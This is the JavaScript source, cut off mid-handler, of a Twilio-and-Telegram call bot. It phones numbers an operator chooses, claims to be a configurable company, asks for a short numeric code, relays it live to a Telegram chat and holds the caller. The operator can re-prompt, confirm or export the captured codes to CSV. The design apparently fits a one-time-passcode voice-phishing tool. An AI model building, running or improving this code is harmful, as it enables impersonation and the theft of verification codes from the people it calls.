const express = require("express");
const fs = require("fs");
const path = require("path");
const fetch = require("node-fetch");
const twilio = require("twilio");

const app = express();
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const PORT = process.env.PORT || 3000;

// ============================================================
// ENV
// ============================================================

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

const TWILIO_ACCOUNT_SID =
  process.env.TWILIO_ACCOUNT_SID || process.env.TWILIO_SID;
const TWILIO_AUTH_TOKEN =
  process.env.TWILIO_AUTH_TOKEN || process.env.TWILIO_TOKEN;
const TWILIO_NUMBER = process.env.TWILIO_NUMBER;

const BASE_URL = process.env.BASE_URL || "";

const OWNER_ID = String(process.env.OWNER_ID || "");
const ADMIN_IDS = (process.env.ADMIN_IDS || "")
  .split(",")
  .map(s => s.trim())
  .filter(Boolean);

const QUICK_DIAL_A_LABEL = process.env.QUICK_DIAL_A_LABEL || "Quick A";
const QUICK_DIAL_A_NUMBER = process.env.QUICK_DIAL_A_NUMBER || "";
const QUICK_DIAL_B_LABEL = process.env.QUICK_DIAL_B_LABEL || "Quick B";
const QUICK_DIAL_B_NUMBER = process.env.QUICK_DIAL_B_NUMBER || "";
const QUICK_DIAL_C_LABEL = process.env.QUICK_DIAL_C_LABEL || "Quick C";
const QUICK_DIAL_C_NUMBER = process.env.QUICK_DIAL_C_NUMBER || "";

const client = twilio(TWILIO_ACCOUNT_SID, TWILIO_AUTH_TOKEN);

// ============================================================
// DATABASE
// ============================================================

const DB_FILE = path.join(__dirname, "db.json");

const defaultSettings = {
  company: "Support",
  digits: 6,
  assistant: 0,
  itemName: "booking number",
  greeting:
    "Hello from {company}. Please enter your {digits} digit {item}.",
  retryMessage: "Please re-enter your {item}.",
  reviewMessage: "Please wait while we review your {item}.",
  confirmMessage: "Thank you. Your {item} has been confirmed. Have a great day.",
  failMessage: "Sorry, we could not confirm your {item}. Goodbye.",
  maxRetries: 3,
  inputTimeout: 8,
  holdSeconds: 10,
  autoConfirmSec: 0,
  autoHangupSec: 0,
  paused: false,
  readback: false,
  randomAssistant: false,
  panelTitle: "📞 LIVE CALLS"
};

function defaultDB() {
  return {
    settings: { ...defaultSettings },
    profiles: {},
    history: [],
    logs: [],
    codes: [],
    stats: {
      inboundCalls: 0,
      outboundCalls: 0,
      inputsReceived: 0,
      confirmed: 0,
      retries: 0,
      hungUp: 0,
      autoConfirmed: 0,
      autoHungUp: 0,
      scheduledCalls: 0,
      completedCalls: 0
    },
    admins: ADMIN_IDS
  };
}

let db = defaultDB();

function loadDB() {
  try {
    if (!fs.existsSync(DB_FILE)) {
      db = defaultDB();
      return;
    }

    const raw = fs.readFileSync(DB_FILE, "utf8");
    const parsed = JSON.parse(raw);

    db = {
      settings: { ...defaultSettings, ...(parsed.settings || {}) },
      profiles: parsed.profiles || {},
      history: parsed.history || [],
      logs: parsed.logs || [],
      codes: parsed.codes || [],
      stats: {
        ...defaultDB().stats,
        ...(parsed.stats || {})
      },
      admins: Array.isArray(parsed.admins) ? parsed.admins : ADMIN_IDS
    };
  } catch (e) {
    console.log("loadDB error:", e.message);
    db = defaultDB();
  }
}

function saveDB() {
  try {
    fs.writeFileSync(DB_FILE, JSON.stringify(db, null, 2));
  } catch (e) {
    console.log("saveDB error:", e.message);
  }
}

loadDB();

// ============================================================
// SETTINGS / STATE
// ============================================================

let settings = db.settings;

const assistants = [
  { name: "Nova", voice: "Polly.Joanna" },
  { name: "Lyra", voice: "Polly.Matthew" },
  { name: "Orion", voice: "Polly.Amy" },
  { name: "Astra", voice: "Polly.Brian" },
  { name: "Kairo", voice: "Polly.Justin" },
  { name: "Solara", voice: "Polly.Kendra" }
];

const quickDialTargets = {
  [QUICK_DIAL_A_LABEL]: QUICK_DIAL_A_NUMBER,
  [QUICK_DIAL_B_LABEL]: QUICK_DIAL_B_NUMBER,
  [QUICK_DIAL_C_LABEL]: QUICK_DIAL_C_NUMBER
};

const calls = new Map();

let panelMessageId = null;
let panelDirty = false;
let panelBrokenCount = 0;

let lastDialed = null;
let pendingInput = null;
let scheduledJobs = [];

// ============================================================
// HELPERS
// ============================================================

function getUserId(update) {
  return String(
    update?.message?.from?.id ||
      update?.callback_query?.from?.id ||
      ""
  );
}

function getRole(update) {
  const userId = getUserId(update);
  if (!userId) return "blocked";
  if (userId === OWNER_ID) return "owner";
  if ((db.admins || []).includes(userId)) return "admin";
  return "blocked";
}

function isAuthorized(update) {
  return getRole(update) !== "blocked";
}

function ownerOnly(update) {
  return getRole(update) === "owner";
}

function saveSettings() {
  db.settings = settings;
  saveDB();
}

function incStat(key) {
  db.stats[key] = (db.stats[key] || 0) + 1;
  saveDB();
}

function pushLog(text) {
  db.logs.unshift(`${new Date().toLocaleTimeString()} ${text}`);
  db.logs = db.logs.slice(0, 100);
  saveDB();
}

function pushHistory(text) {
  db.history.unshift(`${new Date().toLocaleString()} ${text}`);
  db.history = db.history.slice(0, 300);
  saveDB();
}

function pushCodeEntry(caller, value, sid = "") {
  db.codes.unshift({
    time: new Date().toLocaleString(),
    caller,
    value,
    sid
  });
  db.codes = db.codes.slice(0, 200);
  saveDB();
}

function markPanelDirty() {
  panelDirty = true;
}

function assistant() {
  return assistants[settings.assistant] || assistants[0];
}

function assistantForCall(call) {
  if (!call) return assistant();
  return assistants[call.assistantIndex] || assistant();
}

function template(str, call = null) {
  return String(str || "")
    .replaceAll("{company}", settings.company)
    .replaceAll("{digits}", String(settings.digits))
    .replaceAll("{item}", settings.itemName)
    .replaceAll("{caller}", call?.caller || "caller");
}

function spacedDigits(value) {
  return String(value || "")
    .split("")
    .join(" ");
}

function callTimerText(call) {
  if (!call || !call.startedAt) return "00:00";
  const total = Math.floor((Date.now() - call.startedAt) / 1000);
  const mm = String(Math.floor(total / 60)).padStart(2, "0");
  const ss = String(total % 60).padStart(2, "0");
  return `${mm}:${ss}`;
}

function sortedCalls() {
  return Array.from(calls.values()).sort(
    (a, b) => (b.startedAt || 0) - (a.startedAt || 0)
  );
}

function newestActiveCall() {
  return sortedCalls().find(
    c => c.status !== "Ended" && c.status !== "Idle"
  ) || null;
}

function getOrCreateCall(callSid) {
  if (!callSid) return null;

  if (!calls.has(callSid)) {
    const ai = settings.randomAssistant
      ? Math.floor(Math.random() * assistants.length)
      : settings.assistant;

    calls.set(callSid, {
      sid: callSid,
      caller: null,
      input: null,
      status: "Idle",
      startedAt: Date.now(),
      assistantIndex: ai,
      retries: 0,
      endedAt: null,
      autoConfirmTimer: null,
      autoHangupTimer: null,
      readbackDone: false,
      newInput: false
    });
  }

  return calls.get(callSid);
}

function removeCallTimers(call) {
  if (!call) return;
  if (call.autoConfirmTimer) {
    clearTimeout(call.autoConfirmTimer);
    call.autoConfirmTimer = null;
  }
  if (call.autoHangupTimer) {
    clearTimeout(call.autoHangupTimer);
    call.autoHangupTimer = null;
  }
}

function cleanupEndedCalls() {
  const now = Date.now();
  for (const [sid, call] of calls.entries()) {
    if (call.status === "Ended" && call.endedAt && now - call.endedAt > 5 * 60 * 1000) {
      calls.delete(sid);
    }
  }
}

function toCsv(rows) {
  const header = "time,caller,value,sid\n";
  const body = rows.map(r => {
    const time = `"${String(r.time).replaceAll('"', '""')}"`;
    const caller = `"${String(r.caller).replaceAll('"', '""')}"`;
    const value = `"${String(r.value).replaceAll('"', '""')}"`;
    const sid = `"${String(r.sid || "").replaceAll('"', '""')}"`;
    return `${time},${caller},${value},${sid}`;
  }).join("\n");
  return header + body;
}

// ============================================================
// TELEGRAM API
// ============================================================

async function tg(method, data) {
  const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/${method}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data)
  });
  return res.json();
}

async function tgSend(text, buttons = null, chatId = CHAT_ID) {
  const body = {
    chat_id: chatId,
    text
  };
  if (buttons) {
    body.reply_markup = { inline_keyboard: buttons };
  }
  return tg("sendMessage", body);
}

async function tgEdit(messageId, text, buttons = null) {
  const body = {
    chat_id: CHAT_ID,
    message_id: messageId,
    text
  };
  if (buttons) {
    body.reply_markup = { inline_keyboard: buttons };
  }
  return tg("editMessageText", body);
}

async function tgAnswerCallback(callbackQueryId, text = "") {
  try {
    await tg("answerCallbackQuery", {
      callback_query_id: callbackQueryId,
      text
    });
  } catch {}
}

async function tgSendDocument(filename, contentBuffer) {
  const boundary = "----NodeFormBoundary" + Math.random().toString(16).slice(2);
  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`;

  const chunks = [];

  function pushString(str) {
    chunks.push(Buffer.from(str, "utf8"));
  }

  pushString(`--${boundary}\r\n`);
  pushString(`Content-Disposition: form-data; name="chat_id"\r\n\r\n`);
  pushString(`${CHAT_ID}\r\n`);

  pushString(`--${boundary}\r\n`);
  pushString(`Content-Disposition: form-data; name="document"; filename="${filename}"\r\n`);
  pushString(`Content-Type: text/csv\r\n\r\n`);
  chunks.push(contentBuffer);
  pushString(`\r\n--${boundary}--\r\n`);

  const body = Buffer.concat(chunks);

  const res = await fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": `multipart/form-data; boundary=${boundary}`,
      "Content-Length": String(body.length)
    },
    body
  });

  return res.json();
}

// ============================================================
// PANEL
// ============================================================

function panelButtons(role = "admin") {
  const quickButtons = Object.entries(quickDialTargets)
    .filter(([, value]) => value)
    .slice(0, 3)
    .map(([label]) => ({
      text: `📲 ${label}`,
      callback_data: `qd:${label}`
    }));

  const profileButtons = Object.keys(db.profiles)
    .slice(0, 4)
    .map(name => ({
      text: `📁 ${name}`,
      callback_data: `profile:${name}`
    }));

  const rows = [
    [
      { text: "✔ Confirm", callback_data: "confirm" },
      { text: "🔁 Retry", callback_data: "retry" }
    ],
    [{ text: "⛔ Hang Up", callback_data: "hangup" }],
    [
      { text: "📞 Call Last", callback_data: "calllast" },
      { text: "📲 Call", callback_data: "call" }
    ],
    [{ text: settings.paused ? "▶ Resume" : "⏸ Pause", callback_data: settings.paused ? "resume" : "pause" }],
    [{ text: "⚡ Wake Server", callback_data: "wake" }],
    [
      { text: "📊 Status", callback_data: "status" },
      { text: "📜 Logs", callback_data: "logs" }
    ]
  ];

  if (quickButtons.length) rows.splice(3, 0, quickButtons);
  if (profileButtons.length) rows.splice(4, 0, profileButtons);

  if (role === "owner") {
    rows.push([
      { text: "👥 Admins", callback_data: "admins" }
    ]);
  }

  return rows;
}

function panelText(role = "admin") {
  cleanupEndedCalls();

  const active = sortedCalls().slice(0, 8);
  const lines = [settings.panelTitle, ""];

  if (!active.length) {
    lines.push("No active calls");
    lines.push("");
  } else {
    active.forEach((call, index) => {
      const statusIcon =
        call.status === "Ringing" ? "📳" :
        call.status === "Answered" ? "🟢" :
        call.status === "Held" ? "⏳" :
        call.status === "Paused" ? "⏸" :
        call.status === "Ended" ? "⚫" : "⚪";

      let inputText = call.input || "waiting";
      if (call.newInput) {
        inputText = `🔥 ${inputText}`;
        call.newInput = false;
      }

      lines.push(`📞 CALL ${index + 1} — ${statusIcon} ${call.status}`);
      lines.push(`Caller: ${call.caller || "Unknown"}`);
      lines.push(`${settings.itemName}: ${inputText}`);
      lines.push(`Retries: ${call.retries}/${settings.maxRetries}`);
      lines.push(`Assistant: ${assistantForCall(call).name}`);
      lines.push(`Time: ${callTimerText(call)}`);
      lines.push("");
    });
  }

  lines.push(`Company: ${settings.company}`);
  lines.push(`Digits: ${settings.digits}`);
  lines.push(`Assistant: ${assistant().name}`);
  lines.push(`Item: ${settings.itemName}`);
  lines.push(`Paused: ${settings.paused ? "Yes" : "No"}`);
  lines.push(`Role: ${role}`);
  lines.push(`Admins: ${(db.admins || []).length}`);
  lines.push(`Max Retries: ${settings.maxRetries}`);
  lines.push(`Input Timeout: ${settings.inputTimeout}s`);
  lines.push(`Auto Confirm: ${settings.autoConfirmSec || 0}s`);
  lines.push(`Auto Hangup: ${settings.autoHangupSec || 0}s`);

  return lines.join("\n");
}

async function updatePanel(forceNew = false, role = "admin") {
  try {
    const text = panelText(role);
    const buttons = panelButtons(role);

    if (!panelMessageId || forceNew) {
      const msg = await tgSend(text, buttons);
      if (msg && msg.result && msg.result.message_id) {
        panelMessageId = msg.result.message_id;
      }
      return;
    }

    const result = await tgEdit(panelMessageId, text, buttons);

    if (!result || result.ok === false) {
      panelBrokenCount++;
      if (panelBrokenCount >= 2) {
        panelMessageId = null;
        await updatePanel(true, role);
      }
    } else {
      panelBrokenCount = 0;
    }
  } catch {
    panelBrokenCount++;
    if (panelBrokenCount >= 2) {
      panelMessageId = null;
    }
  }
}

// ============================================================
// TWILIO CONTROL
// ============================================================

async function startCall(number) {
  if (!number) return;

  if (settings.paused) {
    await tgSend("⏸ Outbound calling is paused");
    return;
  }

  lastDialed = number;
  incStat("outboundCalls");

  await client.calls.create({
    url: `${BASE_URL}/ivr`,
    to: number,
    from: TWILIO_NUMBER,
    statusCallback: `${BASE_URL}/call-status`,
    statusCallbackEvent: ["initiated", "ringing", "answered", "completed"],
    statusCallbackMethod: "POST"
  });

  pushLog(`Outbound call started to ${number}`);
  pushHistory(`Outbound call to ${number}`);
  markPanelDirty();
}

async function updateLiveCallTwiml(callSid, twiml) {
  if (!callSid) return;
  await client.calls(callSid).update({ twiml });
}

async function endLiveCallImmediately(callSid) {
  if (!callSid) return;
  await client.calls(callSid).update({
    twiml: `<Response><Hangup/></Response>`
  });
}

function buildInputTwiml(call) {
  const voice = assistantForCall(call).voice;
  const greeting = template(settings.greeting, call);

  return `
<Response>
<Gather numDigits="${settings.digits}" action="${BASE_URL}/input" method="POST" timeout="${settings.inputTimeout}">
<Say voice="${voice}">
${greeting}
</Say>
</Gather>
<Redirect method="POST">${BASE_URL}/ivr</Redirect>
</Response>
`;
}

function buildRetryTwiml(call) {
  const voice = assistantForCall(call).voice;
  const retryText = template(settings.retryMessage, call);

  return `
<Response>
<Gather numDigits="${settings.digits}" action="${BASE_URL}/input" method="POST" timeout="${settings.inputTimeout}">
<Say voice="${voice}">
${retryText}
</Say>
</Gather>
<Redirect method="POST">${BASE_URL}/hold</Redirect>
</Response>
`;
}

function buildReviewTwiml(call) {
  const voice = assistantForCall(call).voice;
  const reviewText = template(settings.reviewMessage, call);

  if (settings.readback && call && call.input && !call.readbackDone) {
    call.readbackDone = true;
    return `
<Response>
<Say voice="${voice}">
You entered ${spacedDigits(call.input)}.
</Say>
<Say voice="${voice}">
${reviewText}
</Say>
<Redirect method="POST">${BASE_URL}/hold</Redirect>
</Response>
`;
  }

  return `
<Response>
<Say voice="${voice}">
${reviewText}
</Say>
<Redirect method="POST">${BASE_URL}/hold</Redirect>
</Response>
`;
}

function buildConfirmTwiml(call) {
  const voice = assistantForCall(call).voice;
  return `
<Response>
<Say voice="${voice}">
${template(settings.confirmMessage, call)}
</Say>
<Hangup/>
</Response>
`;
}

function buildFailureTwiml(call) {
  const voice = assistantForCall(call).voice;
  return `
<Response>
<Say voice="${voice}">
${template(settings.failMessage, call)}
</Say>
<Hangup/>
</Response>
`;
}

function schedulePerCallTimers(call) {
  removeCallTimers(call);

  if (!call || call.status === "Ended") return;

  if (settings.autoConfirmSec > 0) {
    call.autoConfirmTimer = setTimeout(async () => {
      try {
        if (call.status !== "Ended" && call.sid) {
          await updateLiveCallTwiml(call.sid, buildConfirmTwiml(call));
          call.status = "Ended";
          call.endedAt = Date.now();
          incStat("confirmed");
          incStat("autoConfirmed");
          incStat("completedCalls");
          pushLog(`Auto confirmed ${call.caller || call.sid}`);
          pushHistory(`Auto confirmed ${call.caller || call.sid}`);
          markPanelDirty();
        }
      } catch {}
    }, settings.autoConfirmSec * 1000);
  }

  if (settings.autoHangupSec > 0) {
    call.autoHangupTimer = setTimeout(async () => {
      try {
        if (call.status !== "Ended" && call.sid) {
          await endLiveCallImmediately(call.sid);
          call.status = "Ended";
          call.endedAt = Date.now();
          incStat("hungUp");
          incStat("autoHungUp");
          incStat("completedCalls");
          pushLog(`Auto hung up ${call.caller || call.sid}`);
          pushHistory(`Auto hung up ${call.caller || call.sid}`);
          markPanelDirty();
        }
      } catch {}
    }, settings.autoHangupSec * 1000);
  }
}

function scheduleOutboundCall(number, delayMs) {
  const id = Date.now() + Math.random();

  const timeout = setTimeout(async () => {
    try {
      await startCall(number);
      incStat("scheduledCalls");
      pushLog(`Scheduled call fired to ${number}`);
      pushHistory(`Scheduled call fired to ${number}`);
    } catch (e) {
      pushLog(`Scheduled call failed to ${number}: ${e.message}`);
    } finally {
      scheduledJobs = scheduledJobs.filter(x => x.id !== id);
    }
  }, delayMs);

  scheduledJobs.push({
    id,
    number,
    fireAt: Date.now() + delayMs,
    timeout
  });
}

function parseDelay(text) {
  const value = text.trim().toLowerCase();

  const sec = value.match(/^(\d+)s$/);
  if (sec) return parseInt(sec[1], 10) * 1000;

  const min = value.match(/^(\d+)m$/);
  if (min) return parseInt(min[1], 10) * 60 * 1000;

  const hr = value.match(/^(\d+)h$/);
  if (hr) return parseInt(hr[1], 10) * 60 * 60 * 1000;

  return null;
}

// ============================================================
// ROUTES
// ============================================================

app.get("/", (req, res) => {
  res.send("Server running");
});

app.get("/ping", (req, res) => {
  res.send("pong");
});

app.get("/health", (req, res) => {
  res.json({
    status: "ok",
    time: Date.now(),
    activeCalls: sortedCalls().filter(c => c.status !== "Ended").length,
    paused: settings.paused,
    lastDialed,
    admins: (db.admins || []).length
  });
});

app.get("/ivr", (req, res) => {
  res.type("text/xml");
  res.send(`<Response><Say>IVR endpoint is working.</Say></Response>`);
});

// ============================================================
// CALL STATUS
// ============================================================

app.post("/call-status", async (req, res) => {
  try {
    const status = req.body.CallStatus;
    const from = req.body.From;
    const sid = req.body.CallSid;

    const call = getOrCreateCall(sid);
    if (call) {
      if (from) call.caller = from;

      if (status === "ringing") {
        call.status = "Ringing";
        if (!call.startedAt) call.startedAt = Date.now();
      }

      if (status === "in-progress" || status === "answered") {
        call.status = "Answered";
        if (!call.startedAt) call.startedAt = Date.now();
      }

      if (status === "completed") {
        call.status = "Ended";
        call.endedAt = Date.now();
        removeCallTimers(call);
        incStat("completedCalls");
      }

      markPanelDirty();
    }
  } catch (e) {
    console.log("call-status error:", e.message);
  }

  res.sendStatus(200);
});

// ============================================================
// IVR START
// ============================================================

app.post("/ivr", async (req, res) => {
  try {
    const sid = req.body.CallSid;
    const from = req.body.From;

    const call = getOrCreateCall(sid);
    if (call) {
      call.caller = from || call.caller;
      call.status = settings.paused ? "Paused" : "Answered";
      call.startedAt = call.startedAt || Date.now();
      call.assistantIndex = settings.randomAssistant
        ? Math.floor(Math.random() * assistants.length)
        : settings.assistant;
    }

    incStat("inboundCalls");
    markPanelDirty();

    res.type("text/xml");

    if (settings.paused) {
      return res.send(`
<Response>
<Say voice="${assistantForCall(call).voice}">
Calling is currently paused. Please try again later.
</Say>
<Hangup/>
</Response>
`);
    }

    res.send(buildInputTwiml(call));
  } catch (e) {
    console.log("/ivr error:", e.message);
    res.type("text/xml");
    res.send(`<Response><Say>Application error.</Say></Response>`);
  }
});

// ============================================================
// INPUT
// ============================================================

app.post("/input", async (req, res) => {
  try {
    const digits = req.body.Digits;
    const caller = req.body.From;
    const sid = req.body.CallSid;

    const call = getOrCreateCall(sid);

    if (call) {
      call.caller = caller;
      call.input = digits;
      call.status = "Held";
      call.startedAt = Date.now();
      call.readbackDone = false;
      call.newInput = true;
    }

    incStat("inputsReceived");
    pushLog(`${caller} : ${digits}`);
    pushHistory(`${caller} -> ${settings.itemName}: ${digits}`);
    pushCodeEntry(caller, digits, sid);

    res.type("text/xml");
    res.send(buildReviewTwiml(call));

    try {
      await tgSend(`${digits}`);

      if (!panelMessageId) {
        await updatePanel(true, "owner");
      } else {
        markPanelDirty();
        await updatePanel(false, "owner");
      }
    } catch (e) {
      console.log("telegram send error:", e.message);
    }

    schedulePerCallTimers(call);
  } catch (e) {
    console.log("/input error:", e.message);
    res.type("text/xml");
    res.send(`<Response><Say>Application error.</Say></Response>`);
  }
});

// ============================================================
// HOLD
// ============================================================

app.post("/hold", (req, res) => {
  res.type("text/xml");
  res.send(`
<Response>
<Pause length="${settings.holdSeconds}"/>
<Redirect method="POST">${BASE_URL}/hold</Redirect>
</Response>
`);
});

// ============================================================
// TELEGRAM
// ============================================================

app.post("/telegram", async (req, res) => {
  try {
    const update = req.body || {};
    const role = getRole(update);

    if (!isAuthorized(update)) {
      return res.sendStatus(200);
    }

    if (update.callback_query) {
      const action = update.callback_query.data;
      const callbackId = update.callback_query.id;
      const call = newestActiveCall();
      const callSid = call ? call.sid : null;

      if (action === "confirm") {
        if (callSid) {
          await updateLiveCallTwiml(callSid, buildConfirmTwiml(call));
          call.status = "Ended";
          call.endedAt = Date.now();
          removeCallTimers(call);
          incStat("confirmed");
          incStat("completedCalls");
          pushLog("Confirmed");
          pushHistory(`Confirmed ${call.caller || call.sid}`);
          markPanelDirty();
        }
        await tgAnswerCallback(callbackId, "Confirmed");
        return res.sendStatus(200);
      }

      if (action === "retry") {
        if (callSid) {
          call.retries++;

          if (call.retries >= settings.maxRetries) {
            await updateLiveCallTwiml(callSid, buildFailureTwiml(call));
            call.status = "Ended";
            call.endedAt = Date.now();
            removeCallTimers(call);
            incStat("completedCalls");
            pushLog("Max retries reached");
            pushHistory(`Max retries reached for ${call.caller || call.sid}`);
          } else {
            await updateLiveCallTwiml(callSid, buildRetryTwiml(call));
            call.input = null;
            call.status = "Answered";
            incStat("retries");
            pushLog("Retry requested");
          }
        }

        markPanelDirty();
        await tgAnswerCallback(callbackId, "Retry sent");
        return res.sendStatus(200);
      }

      if (action === "hangup") {
        if (callSid) {
          await endLiveCallImmediately(callSid);
          call.status = "Ended";
          call.endedAt = Date.now();
          removeCallTimers(call);
          incStat("hungUp");
          incStat("completedCalls");
          pushLog("Hung up");
          pushHistory(`Hung up ${call.caller || call.sid}`);
          markPanelDirty();
        }
        await tgAnswerCallback(callbackId, "Hung up");
        return res.sendStatus(200);
      }

      if (action === "calllast") {
        if (lastDialed) {
          await startCall(lastDialed);
          await tgSend(`📞 Calling last dialed number ${lastDialed}`);
        } else {
          await tgSend("No previous outbound call");
        }
        await tgAnswerCallback(callbackId, "Calling");
        return res.sendStatus(200);
      }

      if (action === "call") {
        pendingInput = "call";
        await tgSend("Send number to call.\nExample:\n/call +447123456789");
        await tgAnswerCallback(callbackId, "Waiting for number");
        return res.sendStatus(200);
      }

      if (action === "pause") {
        if (role !== "owner") {
          await tgAnswerCallback(callbackId, "Owner only");
          return res.sendStatus(200);
        }
        settings.paused = true;
        saveSettings();
        markPanelDirty();
        await tgAnswerCallback(callbackId, "Paused");
        return res.sendStatus(200);
      }

      if (action === "resume") {
        if (role !== "owner") {
          await tgAnswerCallback(callbackId, "Owner only");
          return res.sendStatus(200);
        }
        settings.paused = false;
        saveSettings();
        markPanelDirty();
        await tgAnswerCallback(callbackId, "Resumed");
        return res.sendStatus(200);
      }

      if (action === "wake") {
        await fetch(BASE_URL).catch(() => {});
        await fetch(BASE_URL + "/ping").catch(() => {});
        await fetch(BASE_URL + "/health").catch(() => {});
        await tgSend("⚡ Server wake request sent");
        await tgAnswerCallback(callbackId, "Server waking");
        return res.sendStatus(200);
      }

      if (action === "status") {
        markPanelDirty();
        await updatePanel(false, role);
        await tgAnswerCallback(callbackId, "Panel refreshed");
        return res.sendStatus(200);
      }

      if (action === "logs") {
        let text = "📜 Logs\n\n";
        db.logs.slice(0, 25).forEach(l => {
          text += l + "\n";
        });
        await tgSend(text);
        await tgAnswerCallback(callbackId, "Logs sent");
        return res.sendStatus(200);
      }

      if (action === "admins") {
        if (role !== "owner") {
          await tgAnswerCallback(callbackId, "Owner only");
          return res.sendStatus(200);
        }
        const out = (db.admins || []).length
          ? "👥 Admins\n\n" + db.admins.join("\n")
          : "No admins";
        await tgSend(out);
        await tgAnswerCallback(callbackId, "Admins sent");
        return res.sendStatus(200);
      }

      if (action.startsWith("qd:")) {
        const label = action.split(":")[1];
        const number = quickDialTargets[label];
        if (number) {
          await startCall(number);
          await tgSend(`📲 Calling ${label}: ${number}`);
        } else {
          await tgSend("Quick dial not set");
        }
        await tgAnswerCallback(callbackId, "Calling");
        return res.sendStatus(200);
      }

      if (action.startsWith("profile:")) {
        const name = action.split(":")[1];
        const profile = db.profiles[name];

        if (profile) {
          settings.company = profile.company;
          settings.digits = profile.digits;
          settings.assistant = profile.assistant;
          settings.itemName = profile.itemName;
          saveSettings();
          await tgSend(`📁 Profile loaded: ${name}`);
          markPanelDirty();
          await updatePanel(false, role);
        } else {
          await tgSend("Profile not found");
        }

        await tgAnswerCallback(callbackId, "Profile");
        return res.sendStatus(200);
      }
    }

    if (update.message && update.message.text) {
      const text = update.message.text.trim();

      if (pendingInput === "call" && !text.startsWith("/")) {
        pendingInput = null;
        await startCall(text);
        await tgSend(`📞 Calling ${text}`);
        return res.sendStatus(200);
      }

      if (text === "/panel" || text === "/menu" || text === "/status") {
        panelMessageId = null;
        await updatePanel(true, role);
        return res.sendStatus(200);
      }

      if (text === "/help" || text === "/commands") {
        await tgSend(`🤖 Commands

/panel
/menu
/status
/logs
/history
/stats
/codes
/clearcodes
/export
/call +number
/calllast
/digits X
/assistant X
/company NAME
/item NAME
/profile NAME
/saveprofile NAME
/deleteprofile NAME
/profiles
/maxretries X
/timeout X
/autoconfirm X
/autohangup X
/pause
/resume
/stop
/quickdials
/schedule +number 10m
/settings
/listadmins
/addadmin ID
/removeadmin ID`);
        return res.sendStatus(200);
      }

      if (text === "/settings") {
        await tgSend(`⚙ Current Settings

Company: ${settings.company}
Digits: ${settings.digits}
Assistant: ${assistant().name}
Item: ${settings.itemName}
Max Retries: ${settings.maxRetries}
Input Timeout: ${settings.inputTimeout}
Auto Confirm: ${settings.autoConfirmSec}
Auto Hangup: ${settings.autoHangupSec}
Paused: ${settings.paused ? "Yes" : "No"}
Role: ${role}`);
        return res.sendStatus(200);
      }

      if (text === "/logs") {
        let out = "📜 Logs\n\n";
        db.logs.slice(0, 25).forEach(l => {
          out += l + "\n";
        });
        await tgSend(out);
        return res.sendStatus(200);
      }

      if (text === "/history") {
        let out = "🗂 History\n\n";
        db.history.slice(0, 30).forEach(l => {
          out += l + "\n";
        });
        await tgSend(out);
        return res.sendStatus(200);
      }

      if (text === "/stats") {
        await tgSend(`📈 Stats

Inbound: ${db.stats.inboundCalls}
Outbound: ${db.stats.outboundCalls}
Inputs: ${db.stats.inputsReceived}
Confirmed: ${db.stats.confirmed}
Retries: ${db.stats.retries}
Hung Up: ${db.stats.hungUp}
Auto Confirmed: ${db.stats.autoConfirmed}
Auto Hung Up: ${db.stats.autoHungUp}
Completed: ${db.stats.completedCalls}
Scheduled: ${db.stats.scheduledCalls}`);
        return res.sendStatus(200);
      }

      if (text === "/codes") {
        if (!db.codes.length) {
          await tgSend("No saved entries.");
        } else {
          let out = "🗂 Recent Entries\n\n";
          db.codes.slice(0, 20).forEach(c => {
            out += `${c.time}\n${c.caller} → ${c.value}\n\n`;
          });
          await tgSend(out);
        }
        return res.sendStatus(200);
      }

      if (text === "/clearcodes") {
        if (!ownerOnly(update)) {
          await tgSend("Owner only");
          return res.sendStatus(200);
        }
        db.codes = [];
        saveDB();
        await tgSend("Entries cleared");
        return res.sendStatus(200);
      }

      if (text === "/export") {
        if (!ownerOnly(update)) {
          await tgSend("Owner only");
          return res.sendStatus(200);
        }
        const csv = toCsv(db.codes);
        await tgSendDocument("entries.csv", Buffer.from(csv, "utf8"));
        return res.sendStatus(200);
      }

      if (text === "/profiles") {
        const names = Object.keys(db.profiles);
        if (!names.length) {
          await tgSend("No saved profiles");
        } else {
          await tgSend("📁 Profiles\n\n" + names.join("\n"));
        }
        return res.sendStatus(200);
      }

      if (text.startsWith("/saveprofile")) {
        const name = text.split(" ")[1];

        if (!name) {
          await tgSend("Usage: /saveprofile name");
        } else {
          db.profiles[name] = {
            company: settings.company,
            digits: settings.digits,
            assistant: settings.assistant,
            itemName: settings.itemName
          };
          saveDB();
          await tgSend(`✅ Profile saved: ${name}`);
          markPanelDirty();
          await updatePanel(false, role);
        }

        return res.sendStatus(200);
      }

      if (text.startsWith("/profile")) {
        const name = text.split(" ")[1];

        if (!name || !db.profiles[name]) {
          await tgSend("Profile not found");
        } else {
          const p = db.profiles[name];
          settings.company = p.company;
          settings.digits = p.digits;
          settings.assistant = p.assistant;
          settings.itemName = p.itemName;
          saveSettings();
          await tgSend(`📁 Profile loaded: ${name}`);
          markPanelDirty();
          await updatePanel(false, role);
        }

        return res.sendStatus(200);
      }

      if (text.startsWith("/deleteprofile")) {
        const name = text.split(" ")[1];

        if (!name || !db.profiles[name]) {
          await tgSend("Profile not found");
        } else {
          delete db.profiles[name];
          saveDB();
          await tgSend(`🗑 Profile deleted: ${name}`);
          markPanelDirty();
          await updatePanel(false, role);
        }

        return res.sendStatus(200);
      }

      if (text.startsWith("/call ")) {
        const number = text.split(" ")[1];
        if (!number) {
          await tgSend("Usage: /call +447xxxxxxxx");
        } else {
          await startCall(number);
          await tgSend(`📞 Calling ${number}`);
        }
        return res.sendStatus(200);
      }

      if (text === "/calllast") {
        if (!lastDialed) {
          await tgSend("No previous outbound call");
        } else {
          await startCall(lastDialed);
          await tgSend(`📞 Calling ${lastDialed}`);
        }
        return res.sendStatus(200);
      }

      if (text.startsWith("/digits")) {
        const d = parseInt(text.split(" ")[1], 10);
        if (d >= 2 && d <= 10) {
          settings.digits = d;
          saveSettings();
          await tgSend(`✅ ${d} digits set`);
          markPanelDirty();
          await updatePanel(false, role);
        } else {
          await tgSend("Use /digits 2 to 10");
        }
        return res.sendStatus(200);
      }

      if (text.startsWith("/assistant")) {
        const a = parseInt(text.split(" ")[1], 10);
        if (a >= 1 && a <= assistants.length) {
          settings.assistant = a - 1;
